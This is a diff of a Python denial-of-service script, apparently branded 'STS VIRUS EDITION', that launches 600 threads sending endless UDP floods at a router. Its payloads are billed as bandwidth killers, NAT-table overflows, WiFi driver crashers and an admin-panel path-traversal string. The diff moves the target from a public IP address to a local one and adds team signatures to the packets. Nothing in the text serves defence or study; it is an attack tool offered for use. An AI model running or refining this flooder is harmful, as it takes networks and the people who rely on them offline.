@@ -4,9 +4,9 @@ import time
 import random
 import struct
 
-TARGET_IP = "62.109.121.42"  # YOUR ROUTER
+TARGET_IP = "192.168.1.1"  # YOUR ROUTER
 
-# ==================== STS VIRUS HEADERS ====================
+# ==================== STS VIRUS HEADERS (ASCII ONLY) ====================
 PPS_VIRUSES = [
     # STS Strike Team Sierra Rapid PPS
     b'STS-RAPID\x00' + random.randbytes(56),
@@ -14,11 +14,11 @@ PPS_VIRUSES = [
     # STARSHIP PPS Virus
     b'STARSHIP-PPS\x00' + b'\xDE\xAD' * 26,
     
-    # ZAP-DEAD PPS Header
-    b'ZAP-DEAD***.★★.★\x00' + b'\xFF\x00' * 22,
+    # ZAP-DEAD PPS Header (ASCII version)
+    b'ZAP-DEAD-STAR-STAR-STAR.DOT-DOT.DOT\x00' + b'\xFF\x00' * 22,
     
-    # 💥STS💥 PPS Marker
-    b'\xE2\x9A\xA0STS\xE2\x9A\xA0' + b'\xCC' * 56,
+    # STS PPS Marker (ASCII version)
+    b'STS-PPS-MARKER\x00' + b'\xCC' * 50,
     
     # Sierra Team Signature
     b'SIERRA-TEAM\x00' + b'\xAA\x55' * 26,
@@ -31,11 +31,11 @@ BW_VIRUSES = [
     # STARSHIP Bandwidth Destroyer
     b'STARSHIP-BW\x00' + b'\xDE\xAD\xBE\xEF' * 250,
     
-    # ZAP-DEAD Bandwidth Killer  
-    b'ZAP-DEAD-BW***\x00' + b'\xCA\xFE\xBA\xBE' * 250,
+    # ZAP-DEAD Bandwidth Killer (ASCII version)
+    b'ZAP-DEAD-BW-STAR-STAR-STAR\x00' + b'\xCA\xFE\xBA\xBE' * 250,
     
-    # 💥STS💥 Maximum Bandwidth
-    b'\xE2\x9A\xA0STS-BW\xE2\x9A\xA0' + random.randbytes(1000),
+    # STS Maximum Bandwidth (ASCII version)
+    b'STS-BW-MAX\x00' + random.randbytes(1000),
     
     # Sierra Team Bandwidth Bomb
     b'SIERRA-BANDWIDTH\x00' + bytes([i % 256 for i in range(1000)]),
@@ -51,31 +51,46 @@ ROUTER_KILL_VIRUSES = [
     # NAT Table Overflow
     b'ZAP-NAT\x00' + bytes([random.randint(1, 254) for _ in range(500)]),
     
-    # WiFi Driver Crash
-    b'💥WIFI\x00\x08\x00' + b'\xAA' * 500,
+    # WiFi Driver Crash (ASCII version)
+    b'WIFI-CRASH\x00\x08\x00' + b'\xAA' * 500,
     
     # Router Admin Panel Crash
     b'SIERRA-ADMIN\x00GET /admin/' + b'../' * 100,
 ]
 
+# STS TEAM NAMES IN ASCII
+STS_NAMES = [
+    b'STRIKE-TEAM-SIERRA',
+    b'STARSHIP',
+    b'STS',
+    b'ZAP-DEAD-STAR-STAR-STAR',
+    b'STS-FINAL-BLOW',
+]
+
 # ==================== VIRUS GENERATORS ====================
 def gen_pps_virus():
     virus = random.choice(PPS_VIRUSES)
-    # Add corrupt body
-    body = bytes([random.randint(0, 255) for _ in range(64 - len(virus))])
-    return virus + body
+    # Add corrupt body with STS signature
+    body_size = 64 - len(virus) - 10
+    body = bytes([random.randint(0, 255) for _ in range(body_size)])
+    signature = random.choice(STS_NAMES)
+    return virus + body + signature[:10]
 
 def gen_bw_virus():
     virus = random.choice(BW_VIRUSES)
-    # Large corrupt body
-    body = bytes([random.choice([0x00, 0xFF, 0x80, 0x7F]) for _ in range(1024 - len(virus))])
-    return virus + body
+    # Large corrupt body with STS signature
+    body_size = 1024 - len(virus) - 15
+    body = bytes([random.choice([0x00, 0xFF, 0x80, 0x7F]) for _ in range(body_size)])
+    signature = random.choice(STS_NAMES)
+    return virus + body + signature[:15]
 
 def gen_kill_virus():
     virus = random.choice(ROUTER_KILL_VIRUSES)
-    # Maximum corruption
-    body = b'\xCC' * (1472 - len(virus))
-    return virus + body
+    # Maximum corruption with STS signature
+    body_size = 1472 - len(virus) - 20
+    body = b'\xCC' * body_size
+    signature = random.choice(STS_NAMES)
+    return virus + body + signature[:20]
 
 # ==================== THREAD CONFIG ====================
 UDP_RAPID_PPS = 150    # Fast small virus packets
@@ -100,7 +115,7 @@ def udp_rapid_pps_virus(thread_id):
     while True:
         try:
             # MAXIMUM SPEED - STS VIRUS PACKETS
-            for _ in range(30):  # 30 virus packets per loop
+            for _ in range(30):
                 virus = gen_pps_virus()
                 
                 # RAPID FIRE to all router ports
@@ -197,6 +212,8 @@ def udp_bandwidth_virus(thread_id):
                 pass
 
 # ==================== LAUNCH ALL 600 VIRUS THREADS ====================
+print("SK1-SSALG | STS VIRUS EDITION | 600 THREADS")
+
 # Start UDP Rapid PPS Virus
 for i in range(UDP_RAPID_PPS):
     t = threading.Thread(target=udp_rapid_pps_virus, args=(i,))
